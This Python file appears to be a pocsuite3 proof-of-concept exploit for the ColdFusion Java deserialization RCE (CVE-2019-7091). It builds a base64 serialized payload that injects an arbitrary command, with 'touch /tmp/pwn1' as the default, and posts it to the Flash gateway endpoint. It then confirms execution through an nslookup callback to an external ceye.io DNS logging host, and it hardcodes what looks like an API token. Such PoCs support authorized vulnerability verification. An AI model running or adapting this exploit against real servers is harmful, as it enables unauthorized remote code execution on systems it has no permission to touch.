!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2019/3/13 5:13 PM
import base64
import json
import time
from collections import OrderedDict

from pocsuite3.api import Output, POCBase, register_poc, requests
from pocsuite3.api import get_listener_ip, get_listener_port, OptItems, OptString
from pocsuite3.lib.utils import random_str


class TestPOC(POCBase):
    name = "Adobe ColdFusion 反序列化 RCE 漏洞(CVE-2019-7091)"
    vulID = '97855'
    author = ['']
    vulType = 'Command Execution'
    version = '1.0'  # default version: 1.0
    references = ['https://helpx.adobe.com/security/products/coldfusion/apsb19-10.html']
    desc = '''2019 年 3 月 5 日，Adobe 发布安全公告，披露 Adobe ColdFusion 存在 JAVA 反序列化漏洞(CVE-2019-7091)。'''

    vulDate = '2019-3-5'
    createDate = '2019-3-14'
    updateDate = '2019-3-14'

    appName = 'Adobe ColdFusion'
    appVersion = 'ColdFusion 2018 Update1及之前版本'
    appPowerLink = 'https://www.adobe.com/products/coldfusion-family.html'
    dork = 'coldfusion'
    samples = []

    def _options(self):
        o = OrderedDict()
        o["platform"] = OptItems(['windows', 'linux'], selected="linux")
        o["command"] = OptString("touch /tmp/pwn1")

        return o

    def _build_payload(self, command):
        payload = b'AAAAAQAAAP////8FAAEALG9yZy5tb3ppbGxhLmphdmFzY3JpcHQudG9vbHMuc2hlbGwuTWFpbi5leGVjAAD/////CgAAAAEKAAAAAgIAAi1lAgDIQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE='
        other = b" " * (200 - len(command))
        payload = base64.b64decode(payload).replace(b'A' * 100, command.encode() + other)
        return payload

    def _verify(self):
        '''verify mode'''
        result = {}
        vulnurl = self.url + "/flashservices/gateway/"

        rand = random_str(5)
        ceye_token = "5df9bef9ed0d27df6f8csc1452b99b5b2p"
        ceye_check = "http://api.ceye.io/v1/records?token={0}&type=dns&filter={1}".format(ceye_token, rand)

        payload_comand = "runCommand('nslookup','{}.j3170ioc.ceye.io')".format(rand)
        payload = self._build_payload(payload_comand)

        requests.post(vulnurl, data=payload)
        time.sleep(5)
        e = requests.get(ceye_check)
        try:
            jon = json.loads(e.text)
            if jon and len(jon["data"]):
                result["VerifyInfo"] = {}
                result["VerifyInfo"]["URL"] = vulnurl
                result["VerifyInfo"]["payload"] = payload_comand
        except:
            return self.parse_output(result)
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

register_poc(TestPOC)
